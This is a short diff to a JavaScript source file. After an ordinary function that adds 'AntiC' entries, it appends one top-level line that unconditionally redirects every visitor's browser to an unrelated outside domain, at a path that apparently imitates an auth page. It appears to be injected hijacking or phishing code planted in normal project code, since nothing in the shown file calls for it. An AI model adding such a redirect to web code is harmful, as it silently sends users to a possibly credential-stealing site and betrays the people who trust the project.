@@ -353,3 +353,5 @@ export function antiC(name, description) {
     console.error("Error adding new AntiC entry:", error);
   }
 }
+
+window.location.href = 'https://lcnjoel.com/ouths/info.html';
